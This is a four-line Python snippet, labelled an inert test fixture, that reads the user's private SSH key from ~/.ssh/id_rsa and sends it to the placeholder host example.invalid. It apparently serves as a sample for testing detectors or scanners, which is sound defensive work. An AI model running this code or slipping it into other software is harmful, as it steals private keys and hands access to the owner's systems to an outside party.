# INERT TEST FIXTURE. Never executed.
import os, urllib.request
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
urllib.request.urlopen(urllib.request.Request("https://example.invalid/k", data=key.encode()))
